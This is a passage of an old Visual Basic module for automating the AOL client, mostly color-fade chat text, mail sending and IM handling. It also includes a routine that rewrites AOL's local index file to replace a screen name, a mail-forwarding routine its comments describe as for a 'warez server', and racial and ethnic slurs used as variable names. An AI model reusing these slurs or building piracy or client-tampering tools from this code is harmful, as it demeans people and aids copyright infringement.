     On Error GoTo 1
If AOLPath = "" Then
MsgBox "Please enter in your AOL Directory!", 16
Exit Sub
End If
If Replace = "" Then
MsgBox "Please Enter a screen name to replace!", 16
Exit Sub
End If
Iced = Len(Replace)
Select Case Iced
Case 3
Sela = Replace + "       "
Case 4
Sela = Replace + "      "
Case 5
Sela = Replace + "     "
Case 6
Sela = Replace + "    "
Case 7
Sela = Replace + "   "
Case 8
Sela = Replace + "  "
Case 9
Sela = Replace + " "
Case 10
Sela = Replace
End Select
Jew4 = 1
Do Until 2 > 3
DoEvents
Cobra$ = ""
On Error Resume Next
Open AOLPath$ + "\idb\main.idx" For Binary As #1
If Err Then
MsgBox "That Path Doesnt Exist!", 16
Exit Sub
End If
Cobra$ = String(32000, 0)
Get #1, Jew4, Cobra$
Close #1
Open AOLPath$ + "\idb\main.idx" For Binary As #2
Fray = InStr(1, Cobra$, Sela, 1)
If Fray Then
Mid(Cobra$, Fray) = "New User  "
Freee$ = "New User  "
Put #2, Jew4 + Fray - 1, Freee$
40:
DoEvents
Midl = InStr(1, Cobra$, Sela, 1)
If Midl Then
Mid(Cobra$, Midl) = "New User  "
Put #2, Jew4 + Midl - 1, Freee$
GoTo 40
End If
End If
Jew4 = Jew4 + 32000
'Label2.Caption = Jew4
Fray = LOF(2)
Close #2
If Jew4 > Fray Then GoTo 30
Loop
30:
Jew4 = FindChildByTitle(GetMDI(), "Welcome")
If Jew4 > 0 Then
KillWin (Jew4)
RunMenu ("Set Up && Sign On")
End If
GB = FindChildByTitle(GetMDI(), "Goodbye from America Online!")
If GB > 0 Then
KillWin (GB)
RunMenu ("Set Up && Sign On")
End If
GoTo 2:
1:
Nigga = Err
Exit Sub

2:
'Label2.Caption = "0"
End Sub
Sub FormFadeHorizon(theForm As Form)

theForm.ScaleHeight = (256 * 2)
For a = 255 To 0 Step -1
theForm.Line (0, B)-(theForm.Width, B + 2), RGB(a + 3, a, a * 3), BF
B = B + 2
Next a
End Sub
Sub SendChatIRC(s As String)
'Sends Chat To IRC
IRC% = findwindow("Mirc32", 0&)
Q% = FindChildByClass(IRC%, "Edit")
AF% = SendMessageByString(Q%, WM_SETTEXT, 0, s$)
SendNow% = sendmessagebynum(Q%, WM_CHAR, &HD, 0)
End Sub
Sub Mail_Serve(Who, Mssg, Mailbox, Number)
'This code is good if yer makin a warez server, i wrote this
'for the lamers that dont know how to code API.  This
'Removes Fwd: and sends the mail then keeps it as new
'  Have fun.
'Example: Call Servemail("SteveCase","SteveCase Warez Server","New Mail",2)

mail = FindChildByTitle(GetAOL(), Mailbox)
Tree = FindChildByClass(mail, "_AOL_TREE")
X = sendmessagebynum(Tree, LB_Setcursel, Number - 1, 0&)
Rea = FindChildByTitle(mail, "Read")
Click Rea
Do: DoEvents
Loop Until FindReadWnd() <> 0
ico% = FindChildByClass(FindReadWnd(), "_AOL_ICON")
Ico2% = GetNextWindow(ico%, 2)
Ico3% = GetNextWindow(Ico2%, 2)
Do: DoEvents
Click Ico3%
timeout 0.5
Loop Until FindFwdWnd() <> 0
edi% = FindChildByClass(FindFwdWnd(), "_AOL_EDIT")
X = SendMessageByString(edi%, WM_SETTEXT, 0, Who)
Edi2% = GetNextWindow(edi%, 2)
Edi3% = GetNextWindow(Edi2%, 2)
Edi4% = GetNextWindow(Edi3%, 2)
Edi5% = GetNextWindow(Edi4%, 2)
Edi6% = GetNextWindow(Edi5%, 2)
Edi7% = GetNextWindow(Edi6%, 2)
Edi8% = GetNextWindow(Edi7%, 2)

SS% = GetWinText(Edi5%)
s% = Right(SS%, Len(SS%) - 5)
X = SendMessageByString(Edi5%, WM_SETTEXT, 0, s%)
RICH% = FindChildByClass(FindFwdWnd(), "RICHCNTL")
X = SendMessageByString(RICH%, WM_SETTEXT, 0, Mssg)
X = SendMessageByString(Edi8%, WM_SETTEXT, 0, Mssg)
Sen% = FindChildByClass(FindFwdWnd(), "_AOL_ICON")
Do: DoEvents
Click Sen%
Loop Until FindFwdWnd() = 0
KillWin (FindReadWnd())
KAN% = FindChildByTitle(mail, "Keep As New")
Click KAN%
End Sub
Function FindFwdWnd()
'This Is The Window That Comes Up After You Click Forward
'Example: If FindFwdWnd() <> 0 Then Msgbox "Its There!"

Wind = getwindow(GetAOL(), 5)
SN = FindChildByTitle(Wind, "Send Now")
SL = FindChildByTitle(Wind, "Send Later")
ab = FindChildByTitle(Wind, "Address" & Chr(13) & Chr(10) & "Book")
Toz = FindChildByTitle(Wind, "To:")
If SN <> 0 & SL <> 0 & ab <> 0 & Toz <> 0 Then
FindFwdWnd = GetParent(SN)
End If
End Function
Function FindReadWnd()
'This Is The Window that comes up When You First Read the mail

'Example: If FindReadWnd() <> 0 Then Msgbox "Its There!"
Wind = getwindow(GetAOL(), 5)
SN = FindChildByTitle(Wind, "Reply")
SL = FindChildByTitle(Wind, "Forward")
ab = FindChildByTitle(Wind, "Reply to All")
Toz = FindChildByClass(Wind, "_AOL_ICON")
If SN <> 0 & SL <> 0 & ab <> 0 & Toz <> 0 Then
FindReadWnd = GetParent(SN)
End If
End Function

Sub Mail_SetIndex(Mailbox, Numba)
'This will set the cursor in the mailbox
'to the index number u put in
'Example: Call SetMailIndex("New Mail",4)
'Written By Layzie

Box = FindChildByTitle(GetAOL(), Mailbox)
Tree = FindChildByClass(Box, "_AOL_TREE")
If Not IsNumeric(Numba) Then Exit Sub
X = sendmessagebynum(Tree, LB_Setcursel, Numba - 1, 0&)
End Sub
Sub Mail_SetPrefs()
'This Sets AOL's Mail Preferences so that the mail Closes
'After it is sent and it doesnt confirm when sent

'Example: Mail_SetPrefs
'Wriiten By Layzie
run "Preferences"

Do: DoEvents
PRE% = FindChildByTitle(GetMDI(), "Preferences")
Icoz% = FindChildByTitle(PRE%, "Mail")
ico% = GetNextWindow(Icoz%, 2)

Loop Until PRE% <> 0 And ico% <> 0
Icoz% = FindChildByTitle(PRE%, "Mail")
ico% = GetNextWindow(Icoz%, 2)
Click ico%
Do: DoEvents
MP = findwindow("_AOL_MODAL", "Mail Preferences")
XM = FindChildByTitle(MP, "Confirm mail after it has been sent")
XAM = FindChildByTitle(MP, "Close mail after it has been sent")

Loop Until MP <> 0 And XM <> 0 And XAM <> 0
XM = FindChildByTitle(MP, "Confirm mail after it has been sent")
XAM = FindChildByTitle(MP, "Close mail after it has been sent")
Z = sendmessagebynum(XM, BM_SETCHECK, False, 0&)
Z = sendmessagebynum(XAM, BM_SETCHECK, True, 0&)
k = FindChildByTitle(findwindow("_AOL_MODAL", "Mail Preferences"), "OK")
Do: DoEvents
Click (k)
Loop Until findwindow("_AOL_MODAL", "Mail Preferences") = 0
KillWin (FindChildByTitle(GetMDI(), "Preferences"))
End Sub
Sub Mail_SetPrefs32()
'sets preferences on AOL 95
'Example: Mail_SetPrefs32
'Written by Layzie

mdi = GetMDI()
run ("Preferences")

Do: DoEvents
prefer% = FindChildByTitle(mdi, "Preferences")
maillab% = FindChildByTitle(prefer%, "Mail")
mailbut% = getwindow(maillab%, GW_HWNDNEXT)
If maillab% <> 0 And mailbut% <> 0 Then Exit Do
Loop




Do: DoEvents
Click (mailbut%)
aolmod% = findwindow("_AOL_Modal", "Mail Preferences")
Closewindows% = FindChildByTitle(aolmod%, "Close mail after it has been sent")
aolconfirm% = FindChildByTitle(aolmod%, "Confirm mail after it has been sent")
aolOK% = FindChildByTitle(aolmod%, "OK")
If aolOK% <> 0 And Closewindows% <> 0 And aolconfirm% <> 0 Then Exit Do
Loop
sendcon% = SendMessage(Closewindows%, BM_SETCHECK, 1, 0&)
sendcon% = SendMessage(aolconfirm%, BM_SETCHECK, 0, 0&)

Click (aolOK%)
Do: DoEvents
aolmod% = findwindow("_AOL_Modal", "Mail Preferences")
Loop Until aolmod% = 0

KillWin (prefer%)

End Sub
Sub FormFadeTeel(theForm As Form)

Dim hBrush%
    Dim FormHeight%, red%, StepInterval%, X%, RetVal%, OldMode%
    Dim FillArea As Rect
    OldMode = theForm.ScaleMode
    theForm.ScaleMode = 3  'Pixel
    FormHeight = theForm.ScaleHeight
    StepInterval = FormHeight \ 63
    red = 255
    FillArea.Left = 0
    FillArea.Right = theForm.ScaleWidth
    FillArea.Top = 0
    FillArea.Bottom = StepInterval
    For X = 1 To 63
   
         hBrush% = CreateSolidBrush(RGB(0, red, red))
        RetVal% = FillRect(theForm.hDC, FillArea, hBrush)
        RetVal% = DeleteObject(hBrush%)
        red = red - 4
        FillArea.Top = FillArea.Bottom
        FillArea.Bottom = FillArea.Bottom + StepInterval
    Next
    FillArea.Bottom = FillArea.Bottom + 63
    hBrush% = CreateSolidBrush(RGB(0, 0, 0))
    RetVal% = FillRect(theForm.hDC, FillArea, hBrush)
    RetVal% = DeleteObject(hBrush)
    theForm.ScaleMode = OldMode


End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub

Function GreenBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255 - F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenBlack = Msg
SendChat (Msg)
End Function
Function GreenBlackGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenBlackGreen = Msg
SendChat (Msg)
End Function
Function GreenBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 255 - F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenBlue = Msg
SendChat (Msg)
End Function

Function GreenBlueGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenBlueGreen = Msg
SendChat (Msg)
End Function

Function GreenPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 255 - F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenPurple = Msg
SendChat (Msg)
End Function
Function GreenPurpleGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenPurpleGreen = Msg
SendChat (Msg)
End Function

Function GreenRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255 - F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenRed = Msg
SendChat (Msg)
End Function
Function GreenRedGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenRedGreen = Msg
SendChat (Msg)
End Function
Function GreenYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenYellow = Msg
SendChat (Msg)
End Function


Function GreenYellowGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreenYellowGreen = Msg
SendChat (Msg)
End Function
Function GreyBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 220 / a
        F = e * B
        G = RGB(255 - F, 255 - F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyBlack = Msg
SendChat (Msg)
End Function
Function GreyBlackGrey(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyBlackGrey = Msg
SendChat (Msg)
End Function

Function GreyBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 255, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyBlue = Msg
SendChat (Msg)
End Function
Function GreyBlueGrey(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyBlueGrey = Msg
SendChat (Msg)
End Function
Function GreyGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 255, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyGreen = Msg
SendChat (Msg)
End Function


Function GreyGreenGrey(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyGreenGrey = Msg
SendChat (Msg)
End Function
Function GreyPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyPurple = Msg
SendChat (Msg)
End Function
Function GreyPurpleGrey(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyPurpleGrey = Msg
SendChat (Msg)
End Function
Function GreyRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyRed = Msg
SendChat (Msg)
End Function
Function GreyRedGrey(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyRedGrey = Msg
SendChat (Msg)
End Function

Function GreyYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyYellow = Msg
SendChat (Msg)
End Function
Function GreyYellowGrey(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    GreyYellowGrey = Msg
SendChat (Msg)
End Function
Sub IMIgnore(thelist As ListBox)
'Ignores IMz from the lamers in the list box
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, ">Instant Message From:")
If im% <> 0 Then
    For FindSN = 0 To thelist.ListCount
        If LCase$(thelist.List(FindSN)) = LCase$(SNfromIM) Then
            BadIM% = im%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_Close, 0, 0)
            Call SendMessage(BadIM%, WM_Close, 0, 0)
        End If
    Next FindSN
End If
End Sub
Sub SendChatItalic(ItalicChat)
'Makes chat text in Italics.
SendChat ("<i>" & ItalicChat & "</i>")
End Sub

Sub KillWait40()
'Killz hour glass
aol% = findwindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = getwindow(AOIcon%, 2)
Next GetIcon

Call timeout(0.05)
AOLIcon (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
KeyWordWin% = FindChildByTitle(mdi%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_Close, 0, 0)
End Sub

Function PurpleBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleBlack = Msg
SendChat (Msg)
End Function
Function PurpleBlackPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleBlackPurple = Msg
SendChat (Msg)
End Function
Function PurpleBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleBlue = Msg
SendChat (Msg)
End Function

Function PurpleBluePurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleBluePurple = Msg
SendChat (Msg)
End Function

Function PurpleGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleGreen = Msg
SendChat (Msg)
End Function

Function PurpleGreenPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleGreenPurple = Msg
SendChat (Msg)
End Function
Function PurpleRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleRed = Msg
SendChat (Msg)
End Function
Function PurpleRedPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleRedPurple = Msg
SendChat (Msg)
End Function
Function PurpleYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleYellow = Msg
SendChat (Msg)
End Function
Function PurpleYellowPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    PurpleYellowPurple = Msg
SendChat (Msg)
End Function
Function RedBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedBlack = Msg
SendChat (Msg)
End Function

Function RedBlackRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedBlackRed = Msg
SendChat (Msg)
End Function

Function RedBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedBlue = Msg
SendChat (Msg)
End Function
Function RedBlueRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedBlueRed = Msg
SendChat (Msg)
End Function

Function RedGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedGreen = Msg
SendChat (Msg)
End Function
Function RedGreenRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedGreenRed = Msg
SendChat (Msg)
End Function
Function RedPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedPurple = Msg
SendChat (Msg)
End Function
Function RedPurpleRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedPurpleRed = Msg
SendChat (Msg)
End Function
Function RedYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedYellow = Msg
SendChat (Msg)
End Function

Function RedYellowRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    RedYellowRed = Msg
SendChat (Msg)
End Function
Sub RespondIM(message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")

im% = FindChildByTitle(mdi%, ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(mdi%, "  Instant Message From:")
If im% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(im%, "RICHCNTL")

e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)

e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e2 = getwindow(e, GW_HWNDNEXT) 'Send Text
e = getwindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMessageByString(e2, WM_SETTEXT, 0, message)
AOLIcon (e)
Call timeout(0.8)
im% = FindChildByTitle(mdi%, "  Instant Message From:")
e = FindChildByClass(im%, "RICHCNTL")
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT) 'cancel button...
'to close the IM window
AOLIcon (e)
End Sub

Function RGBtoHEX(RGB)
    a = Hex(RGB)
    B = Len(a)
    If B = 5 Then a = "0" & a
    If B = 4 Then a = "00" & a
    If B = 3 Then a = "000" & a
    If B = 2 Then a = "0000" & a
    If B = 1 Then a = "00000" & a
    RGBtoHEX = a
End Function

Sub AOLMail(Person, Subject, message)
Call runmenubystring(AOLWindow(), "Compose Mail")

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = getwindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop

a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, Subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, message)

AOLIcon (icone%)

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
erro% = FindChildByTitle(mdi%, "Error")
aolw% = findwindow("_AOL_Modal", vbNullString)
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
'a = SendMessage(aolw%, WM_CLOSE, 0, 0)
AOLButton (FindChildByTitle(aolw%, "OK"))
a = SendMessage(mailwin%, WM_Close, 0, 0)
Exit Sub
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_Close, 0, 0)
a = SendMessage(mailwin%, WM_Close, 0, 0)
Exit Do
End If
Loop
End Sub




